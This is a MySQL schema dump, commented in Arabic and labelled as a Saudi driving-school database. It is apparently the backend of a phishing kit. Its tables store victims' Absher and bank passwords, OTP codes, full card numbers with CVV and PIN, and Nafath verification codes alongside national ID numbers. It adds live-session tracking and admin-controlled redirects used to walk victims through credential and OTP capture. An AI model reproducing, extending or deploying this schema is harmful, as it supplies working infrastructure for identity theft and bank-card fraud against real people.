-- قاعدة بيانات المدرسة السعودية للقيادة

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";

--
-- بنية الجدول `absher_logins`
--

CREATE TABLE `absher_logins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `username_or_id` varchar(255) DEFAULT NULL COMMENT 'اسم المستخدم أو رقم الهوية',
  `password` varchar(255) DEFAULT NULL COMMENT 'كلمة المرور',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول بيانات تسجيل الدخول لأبشر';

--
-- بنية الجدول `absher_otps`
--

CREATE TABLE `absher_otps` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `otp_code` varchar(10) NOT NULL COMMENT 'رمز OTP',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول رموز OTP لأبشر';

--
-- بنية الجدول `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `full_name` varchar(100) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `last_login` timestamp NULL DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT 1,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- إدراج بيانات المدير الافتراضي
--

INSERT INTO `admin` (`username`, `password`, `full_name`, `email`, `is_active`) VALUES
('admin', '$2y$10$ilP0Y9j7C75QQG7D9xL6bO5yGR2XVAVwoYCcey2xrhUGjaDIodTVi', 'المشرف الرئيسي', 'admin@example.com', 1);

--
-- بنية الجدول `bank_logins`
--

CREATE TABLE `bank_logins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `bank` varchar(100) DEFAULT NULL COMMENT 'اسم البنك',
  `user_name` varchar(255) DEFAULT NULL COMMENT 'اسم المستخدم أو الهوية',
  `bk_pass` varchar(255) DEFAULT NULL COMMENT 'كلمة المرور',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول بيانات تسجيل الدخول للبنوك';

--
-- بنية الجدول `bank_otps`
--

CREATE TABLE `bank_otps` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `otp_code` varchar(10) NOT NULL COMMENT 'رمز OTP',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول رموز OTP للبنوك';

--
-- بنية الجدول `cards`
--

CREATE TABLE `cards` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `cardName` varchar(255) DEFAULT NULL COMMENT 'اسم حامل البطاقة',
  `cardNumber` varchar(20) DEFAULT NULL COMMENT 'رقم البطاقة',
  `cardExpiry` varchar(7) DEFAULT NULL COMMENT 'تاريخ الانتهاء MM/YYYY',
  `cvv` varchar(4) DEFAULT NULL COMMENT 'CVV',
  `price` decimal(10,2) DEFAULT NULL COMMENT 'المبلغ المدفوع',
  `payment_method` varchar(50) DEFAULT 'card' COMMENT 'طريقة الدفع',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_created_at` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `card_otps`
--

CREATE TABLE `card_otps` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `card_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `otp_code` varchar(10) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `card_id` (`card_id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `card_pins`
--

CREATE TABLE `card_pins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `card_id` int(11) DEFAULT NULL,
  `client_id` int(11) NOT NULL,
  `pin_code` varchar(10) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `nafad_codes`
--

CREATE TABLE `nafad_codes` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client_id` int(11) NOT NULL COMMENT 'معرف العميل',
  `nafad_code` varchar(10) NOT NULL COMMENT 'رمز التحقق',
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() COMMENT 'تاريخ الإدخال',
  PRIMARY KEY (`id`),
  KEY `idx_client_id` (`client_id`),
  KEY `idx_created_at` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول رموز التحقق لكل عميل';

--
-- بنية الجدول `nafad_logs`
--

CREATE TABLE `nafad_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `phone` varchar(20) DEFAULT NULL,
  `telecom` varchar(50) DEFAULT NULL,
  `id_number` varchar(50) DEFAULT NULL,
  `redirect_to` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `nafad_requests`
--

CREATE TABLE `nafad_requests` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client_id` int(11) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `telecom` varchar(50) NOT NULL,
  `id_number` varchar(50) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `nafath_numbers`
--

CREATE TABLE `nafath_numbers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client_id` int(11) NOT NULL,
  `number` varchar(10) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_client_id` (`client_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `school_selections`
--

CREATE TABLE `school_selections` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `school_name` varchar(255) NOT NULL,
  `ip_address` varchar(50) DEFAULT NULL,
  `user_agent` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `redirect_active` tinyint(1) DEFAULT 0,
  `redirect_url` varchar(255) DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- بنية الجدول `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `request_type` varchar(100) DEFAULT NULL COMMENT 'نوع الطلب',
  `nationality` varchar(100) DEFAULT NULL COMMENT 'الجنسية',
  `ssn` varchar(12) DEFAULT NULL COMMENT 'رقم الهوية الوطنية',
  `name` varchar(255) DEFAULT NULL COMMENT 'الاسم الكامل',
  `phone` varchar(20) DEFAULT NULL COMMENT 'رقم الجوال',
  `date` date DEFAULT NULL COMMENT 'تاريخ الميلاد',
  `email` varchar(255) DEFAULT NULL COMMENT 'البريد الإلكتروني',
  `region` varchar(100) DEFAULT NULL COMMENT 'المنطقة',
  `branch` varchar(255) DEFAULT NULL COMMENT 'الفرع',
  `level` varchar(100) DEFAULT NULL COMMENT 'المستوى',
  `gear_type` varchar(50) DEFAULT NULL COMMENT 'نوع الجير',
  `time_period` varchar(255) DEFAULT NULL COMMENT 'الفترة الزمنية',
  `username` varchar(255) DEFAULT NULL COMMENT 'اسم المستخدم',
  `message` varchar(500) DEFAULT 'طلب جديد' COMMENT 'رسالة الحالة',
  `selected_school` varchar(255) DEFAULT NULL COMMENT 'المدرسة المختارة',
  `currentpage` varchar(100) DEFAULT 'register.php' COMMENT 'الصفحة الحالية',
  `status` tinyint(1) DEFAULT 0 COMMENT 'حالة الطلب: 0=جديد, 1=قيد المعالجة, 2=مقبول, 3=مرفوض',
  `live` tinyint(1) DEFAULT 1 COMMENT 'نشط: 0=غير متصل, 1=متصل',
  `lastlive` bigint(20) DEFAULT NULL COMMENT 'آخر وقت اتصال (timestamp)',
  `ip_address` varchar(50) DEFAULT NULL COMMENT 'عنوان IP',
  `user_agent` text DEFAULT NULL COMMENT 'معلومات المتصفح',
  `session_id` varchar(100) DEFAULT NULL COMMENT 'معرف الجلسة',
  `redirect_to` varchar(50) DEFAULT NULL,
  `redirect_at` datetime DEFAULT NULL,
  `redirect_active` tinyint(1) DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() COMMENT 'تاريخ الإنشاء',
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp() COMMENT 'تاريخ التحديث',
  PRIMARY KEY (`id`),
  KEY `idx_ssn` (`ssn`),
  KEY `idx_phone` (`phone`),
  KEY `idx_email` (`email`),
  KEY `idx_request_type` (`request_type`),
  KEY `idx_created_at` (`created_at`),
  KEY `idx_status` (`status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول بيانات المستخدمين والطلبات';

--
-- بنية الجدول `visits`
--

CREATE TABLE `visits` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `total_visits` int(11) NOT NULL DEFAULT 0 COMMENT 'إجمالي الزيارات',
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- إدراج سجل افتراضي لجدول الزيارات
--

INSERT INTO `visits` (`total_visits`) VALUES (0);

--
-- إضافة القيود (Foreign Keys)
--

ALTER TABLE `absher_logins`
  ADD CONSTRAINT `fk_absher_logins_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

ALTER TABLE `absher_otps`
  ADD CONSTRAINT `fk_absher_otps_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

ALTER TABLE `bank_logins`
  ADD CONSTRAINT `fk_bank_logins_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

ALTER TABLE `bank_otps`
  ADD CONSTRAINT `fk_bank_otps_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

ALTER TABLE `cards`
  ADD CONSTRAINT `fk_cards_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

ALTER TABLE `nafad_codes`
  ADD CONSTRAINT `fk_nafad_codes_client` FOREIGN KEY (`client_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

COMMIT;
